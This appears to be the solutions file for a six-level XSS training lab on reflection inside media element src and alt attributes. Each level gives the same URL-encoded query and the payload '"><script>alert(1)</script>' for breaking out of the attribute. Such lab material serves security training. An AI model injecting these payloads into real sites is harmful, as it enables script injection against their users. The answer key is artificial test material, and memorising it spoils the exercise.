# mediacontext — solutions

Reflections inside media element src/alt attributes — break out of attribute.

### mediacontext-level1

`/mediacontext/level1/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<video src="...">` double-quoted attribute breakout

### mediacontext-level2

`/mediacontext/level2/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<audio src="...">` attribute breakout

### mediacontext-level3

`/mediacontext/level3/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<source src="...">` attribute breakout

### mediacontext-level4

`/mediacontext/level4/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<embed src="...">` attribute breakout

### mediacontext-level5

`/mediacontext/level5/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<track src="...">` attribute breakout

### mediacontext-level6

`/mediacontext/level6/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<img alt="...">` attribute breakout
